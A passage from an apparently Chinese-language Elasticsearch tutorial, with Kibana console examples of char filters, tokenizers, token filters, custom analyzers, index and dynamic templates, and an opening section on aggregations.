char_filter</h3><ul><li>char_filter</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>:<span class="string">"keyword"</span>,</span><br><span class="line">  <span class="attr">"char_filter"</span>:[<span class="string">"html_strip"</span>],</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"&lt;b&gt;hello world&lt;/b&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokens"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"hello world"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">3</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">18</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用 char filter 进行替换</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>: <span class="string">"standard"</span>,</span><br><span class="line">  <span class="attr">"char_filter"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"mapping"</span>,</span><br><span class="line">        <span class="attr">"mappings"</span> : [ <span class="string">"- =&gt; _"</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"123-456, I-test! test-990 650-555-1234"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>char filter 替换表情符号</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>: <span class="string">"standard"</span>,</span><br><span class="line">  <span class="attr">"char_filter"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"mapping"</span>,</span><br><span class="line">        <span class="attr">"mappings"</span> : [ <span class="string">":) =&gt; happy"</span>, <span class="string">":( =&gt; sad"</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"text"</span>: [<span class="string">"I am felling :)"</span>, <span class="string">"Feeling :( today"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>正则表达式</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>: <span class="string">"standard"</span>,</span><br><span class="line">  <span class="attr">"char_filter"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"pattern_replace"</span>,</span><br><span class="line">        <span class="attr">"pattern"</span> : <span class="string">"http://(.*)"</span>,</span><br><span class="line">        <span class="attr">"replacement"</span> : <span class="string">"$1"</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"text"</span> : <span class="string">"http://www.elastic.co"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Demo-tokenizer"><a href="#Demo-tokenizer" class="headerlink" title="Demo tokenizer"></a>Demo tokenizer</h3><ul><li>通过路劲切分</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>:<span class="string">"path_hierarchy"</span>,</span><br><span class="line">  <span class="attr">"text"</span>:<span class="string">"/user/ymruan/a"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokens"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"/user"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">5</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"/user/ymruan"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">12</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"/user/ymruan/a"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">14</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>token_filters</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>: <span class="string">"whitespace"</span>, </span><br><span class="line">  <span class="attr">"filter"</span>: [<span class="string">"stop"</span>,<span class="string">"snowball"</span>], <span class="comment">//on the a</span></span><br><span class="line">  <span class="attr">"text"</span>: [<span class="string">"The gilrs in China are playing this game!"</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokens"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"The"</span>, <span class="comment">//大写的The 不做过滤</span></span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">3</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"gilr"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">4</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">9</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"China"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">13</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">18</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">3</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"play"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">23</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">30</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"game!"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">36</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">41</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"word"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>加入 lowercase 后，The 被当成 stopword 删除</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>: <span class="string">"whitespace"</span>,</span><br><span class="line">  <span class="attr">"filter"</span>: [<span class="string">"lowercase"</span>,<span class="string">"stop"</span>,<span class="string">"snowball"</span>],</span><br><span class="line">  <span class="attr">"text"</span>: [<span class="string">"The gilrs in China are playing this game!"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义-analyzer"><a href="#自定义-analyzer" class="headerlink" title="自定义 analyzer"></a>自定义 analyzer</h3><ul><li>官网自定义分词器的标准格式</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"analysis"</span>: &#123;</span><br><span class="line">      "char_filter": &#123; ... custom character filters ... &#125;,//字符过滤器</span><br><span class="line">      "tokenizer": &#123; ... custom tokenizers ... &#125;,//分词器</span><br><span class="line">      "filter": &#123; ... custom token filters ... &#125;, //词单元过滤器</span><br><span class="line">      "analyzer": &#123; ... custom analyzers ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>自定义分词器</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">PUT my_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"analysis"</span>: &#123;</span><br><span class="line">      <span class="attr">"analyzer"</span>: &#123;</span><br><span class="line">        <span class="attr">"my_custom_analyzer"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"custom"</span>,</span><br><span class="line">          <span class="attr">"char_filter"</span>:[</span><br><span class="line">            <span class="string">"emoticons"</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">"tokenizer"</span>:<span class="string">"punctuation"</span>,</span><br><span class="line">          <span class="attr">"filter"</span>:[</span><br><span class="line">            <span class="string">"lowercase"</span>,</span><br><span class="line">            <span class="string">"english_stop"</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"tokenizer"</span>: &#123;</span><br><span class="line">        <span class="attr">"punctuation"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"pattern"</span>,</span><br><span class="line">          <span class="attr">"pattern"</span>: <span class="string">"[ .,!?]"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"char_filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"emoticons"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"mapping"</span>,</span><br><span class="line">          <span class="attr">"mappings"</span> : [ </span><br><span class="line">            <span class="string">":) =&gt; happy"</span>,</span><br><span class="line">            <span class="string">":( =&gt; sad"</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"english_stop"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"stop"</span>,</span><br><span class="line">          <span class="attr">"stopwords"</span>:<span class="string">"_english_"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dynamic-Template和Index-Template"><a href="#Dynamic-Template和Index-Template" class="headerlink" title="Dynamic Template和Index Template"></a>Dynamic Template和Index Template</h2><h3 id="管理很多索引"><a href="#管理很多索引" class="headerlink" title="管理很多索引"></a>管理很多索引</h3><ul><li>集群上的索引会越来越多，例如，你会为你的日志每天创建一个索引<ul><li>使用多个索引可以让你更好的管理你的数据，提高性能</li><li>logs-2019-05-01</li><li>logs-2019-05-02</li><li>logs-2019-05-03</li></ul></li></ul><h3 id="什么是-Index-Template"><a href="#什么是-Index-Template" class="headerlink" title="什么是 Index Template"></a>什么是 Index Template</h3><ul><li>Index Templates - 帮助你设定 Mappings 和 Settings，并按照一定的规则，自动匹配到新创建的索引之上<ul><li>模版仅在一个索引被新创建时，才会产生作用。修改模版不会影响已创建的索引</li><li>你可以设定多个索引模版，这些设置会被”merge”在一起</li><li>你可以指定”order”的数值，控制”merging”的过程</li></ul></li></ul><h3 id="Index-Template-的工作方式"><a href="#Index-Template-的工作方式" class="headerlink" title="Index Template 的工作方式"></a>Index Template 的工作方式</h3><ul><li>当一个索引被新创建时<ul><li>应用 Elasticsearch 默认的 settings 和 mappings</li><li>应用 order 数值低的 Index Template 中的设定</li><li>应用 order 高的 Index Template 中的设定，之前的设定会被覆盖</li><li>应用创建索引时，用户所指定的 Settings 和 Mappings，并覆盖之前模版中的设定</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数字字符串被映射成text，日期字符串被映射成日期</span></span><br><span class="line">PUT ttemplate/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"someNumber"</span>: <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"someDate"</span>:<span class="string">"2019/01/01"</span></span><br><span class="line">&#125;</span><br><span class="line">GET ttemplate/_mapping</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建默认模板</span></span><br><span class="line">PUT _template/template_default</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"index_patterns"</span>: [<span class="string">"*"</span>],</span><br><span class="line">  <span class="attr">"order"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>:<span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建第二个模板</span></span><br><span class="line">PUT /_template/template_test</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"index_patterns"</span> : [<span class="string">"test*"</span>],</span><br><span class="line">  <span class="attr">"order"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"settings"</span> : &#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span> : <span class="number">2</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="attr">"date_detection"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"numeric_detection"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看template信息</span></span><br><span class="line">GET /_template/template_default</span><br><span class="line">GET /_template/temp*</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入新的数据，index以test开头</span></span><br><span class="line">PUT testtemplate/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"someNumber"</span>:<span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"someDate"</span>:<span class="string">"2019/01/01"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看数据类型推断和replica</span></span><br><span class="line">GET testtemplate/_mapping</span><br><span class="line">GET testtemplate/_settings</span><br><span class="line"></span><br><span class="line">PUT testmy</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>:&#123;</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>:<span class="number">5</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT testmy/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET testmy/_settings</span><br><span class="line">DELETE testmy</span><br><span class="line">DELETE /_template/template_default</span><br><span class="line">DELETE /_template/template_test</span><br></pre></td></tr></table></figure><h3 id="什么是-Dynamic-Template"><a href="#什么是-Dynamic-Template" class="headerlink" title="什么是 Dynamic Template"></a>什么是 Dynamic Template</h3><ul><li>根据 Elasticsearch 识别的数据类型，结合字段名称，来动态设定字段类型<ul><li>所有的字符串类型都设定成 Keyword，或者关闭 keyword 字段</li><li>is 开头的字段都设置成 boolean</li><li>long_开头的都设置成 long 类型</li></ul></li></ul><h3 id="Dynamic-Tempate"><a href="#Dynamic-Tempate" class="headerlink" title="Dynamic Tempate"></a>Dynamic Tempate</h3><ul><li>Dynamic Tempate 是定义在在某个索引的 Mapping 中</li><li>Template有一个名称</li><li>匹配规则是一个数组</li><li>为匹配到字段设置 Mapping</li></ul><p><img src="/images/big-data/es-03/32.jpg" alt="32"></p><h3 id="匹配规则参数"><a href="#匹配规则参数" class="headerlink" title="匹配规则参数"></a>匹配规则参数</h3><ul><li>match_mapping_type∶ 匹配自动识别的字段类型，如 string，boolean等</li><li>match， unmatch∶ 匹配字段名</li><li>path_match, path_unmatch</li></ul><p><img src="/images/big-data/es-03/33.jpg" alt="33"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Dynaminc Mapping 根据类型和字段名</span></span><br><span class="line">DELETE my_index</span><br><span class="line"></span><br><span class="line">PUT my_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"firstName"</span>:<span class="string">"Ruan"</span>,</span><br><span class="line">  <span class="attr">"isVIP"</span>:<span class="string">"true"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my_index/_mapping</span><br><span class="line">DELETE my_index</span><br><span class="line">PUT my_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"dynamic_templates"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"strings_as_boolean"</span>: &#123;</span><br><span class="line">          <span class="attr">"match_mapping_type"</span>: <span class="string">"string"</span>,</span><br><span class="line">          <span class="attr">"match"</span>:<span class="string">"is*"</span>,</span><br><span class="line">          <span class="attr">"mapping"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"boolean"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"strings_as_keywords"</span>: &#123;</span><br><span class="line">          <span class="attr">"match_mapping_type"</span>: <span class="string">"string"</span>,</span><br><span class="line">          <span class="attr">"mapping"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE my_index</span><br><span class="line"><span class="comment">// 结合路径</span></span><br><span class="line">PUT my_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"dynamic_templates"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"full_name"</span>: &#123;</span><br><span class="line">          <span class="attr">"path_match"</span>:   <span class="string">"name.*"</span>,</span><br><span class="line">          <span class="attr">"path_unmatch"</span>: <span class="string">"*.middle"</span>,</span><br><span class="line">          <span class="attr">"mapping"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>:       <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"copy_to"</span>:    <span class="string">"full_name"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: &#123;</span><br><span class="line">    <span class="attr">"first"</span>:  <span class="string">"John"</span>,</span><br><span class="line">    <span class="attr">"middle"</span>: <span class="string">"Winston"</span>,</span><br><span class="line">    <span class="attr">"last"</span>:   <span class="string">"Lennon"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my_index/_search?q=full_name:John</span><br></pre></td></tr></table></figure><h2 id="聚合（Aggregation）"><a href="#聚合（Aggregation）" class="headerlink" title="聚合（Aggregation）"></a>聚合（Aggregation）</h2><p><img src="/images/big-data/es-03/34.jpg" alt="34"></p><ul><li>Elasticsearch 除搜索以外，提供的针对 ES 数据进行统计分析的功能<ul><li>实时性</li><li>Hadoop (T+1)</li></ul></li><li>通过聚合，我们会得到一个数据的概念，是分析和总结全套的数据，而不是寻找单个文档<ul><li>尖沙咀和香港岛的客房数量</li><li>不同的价格区间，可预定的经济型酒店和五星级酒店的数量</li></ul></li><li>高性能，只需要一条语句，就可以从 ES 得到分析结果<ul><li>无需再客户端自己去实现分析逻辑</li></ul></li></ul><h3 id="Kibana-可视化报表-聚合分析"><a href="#Kibana-可视化报表-聚合分析" class="headerlink" title="Kibana 可视化报表 - 聚合分析"></a>Kibana 可视化报表 - 聚合分析</h3><ul><li>公司程序员的工作岗位分布</li><li>公司采用的编程框架分布</li><li>公司员工薪水分布客户的地理位置分布</li><li>订单的增长情况</li><li>等等</li></ul><h3 id="集合的分类"><a href="#集合的分类" class="headerlink" title="集合的分类"></a>集合的分类</h3><ul><li>Bucket Aggregation - 一些列满足特定条件的文档的集合</li><li>Metric Aggregation - 一些数学运算，可以对文档字段进行统计分析</li><li>Pipeline Aggregation - 对其他的聚合结果进行二次聚合</li><li>Matrix Aggregation - 支持对多个字段的操作并提供一个结果矩阵</li></ul><h3 id="Bucket-amp-Metric"><a href="#Bucket-amp-Metric" 